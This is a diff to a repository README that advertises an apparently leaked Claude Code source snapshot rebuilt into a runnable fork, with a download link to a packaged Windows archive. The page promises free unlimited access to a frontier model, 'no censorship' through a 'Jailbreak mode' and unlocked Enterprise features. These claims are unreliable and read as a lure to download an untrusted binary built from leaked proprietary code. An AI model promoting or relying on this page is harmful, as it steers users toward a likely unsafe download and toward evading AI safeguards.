@@ -16,6 +16,10 @@ The source map file in the published npm package contained a reference to the fu
 
 ---
 
+## 🔓 Fully Buildable & Runnable Claude Code Fork | Claude Opus 4.6 Unlocked
+
+I spent significant effort reverse-engineering the entire build system from scratch, fixing every compilation error, and making this source snapshot actually work.
+
 <div align="center">
   <a href="../../releases/download/leaked-claude-code/ClaudeCode_x64.7z">
     <img width="700" alt=" Claude Code — Leaked Source." src="assets/hmv4dn7elu.png" />
@@ -48,6 +52,39 @@ The key is securely stored using the Windows Credential Manager.
 **Claude Code Unlocked** is a local server and command-line interface that turns your computer into a control terminal for the world's most powerful neural network **for free**.
 
 Unlike the official web interface, there are no limits on the number of messages, no censorship (with Jailbreak mode enabled), and Enterprise-level features are unlocked.
+
+---
+
+### The Problem
+
+The raw source snapshot is **unbuildable** — no `package.json`, no `tsconfig.json`, no dependency manifest, no build scripts. Dozens of internal modules are missing. You cannot compile or run it.
+
+### What I Fixed
+
+| Work | Details |
+|------|---------|
+| **Dependency reconstruction** | Reverse-engineered 60+ npm dependencies from ~1,900 TypeScript source files |
+| **90+ stub modules created** | Anthropic internal packages (`@ant/*`), native addons, feature-gated modules |
+| **Build config** | `package.json`, `tsconfig.json`, `bunfig.toml`, `.gitignore` |
+| **Source fixes** | Runtime MACRO injection, Commander.js flag fix, `bun:bundle` polyfill, missing exports |
+| **Cloud SDK stubs** | Bedrock/Vertex/Foundry/Azure stubbed to avoid heavy downloads |
+| **OTel exporter stubs** | 10 OpenTelemetry OTLP exporters stubbed |
+
+
+### What You Can Do With It
+
+- **Read and study** the full Claude Code architecture (~512K lines of TypeScript)
+- **Modify the source** — add your own tools, agents, skills, commands
+- **Build custom versions** with `bun build src/main.tsx --outdir=dist --target=bun`
+- **Toggle feature flags** (KAIROS, PROACTIVE, BRIDGE_MODE, VOICE_MODE, etc.)
+- **Extend via MCP servers, custom agents, custom skills** without touching source
+
+---
+<div align="center">
+  
+  Star ⭐ if this helps you!
+
+</div>
 
 ---
 
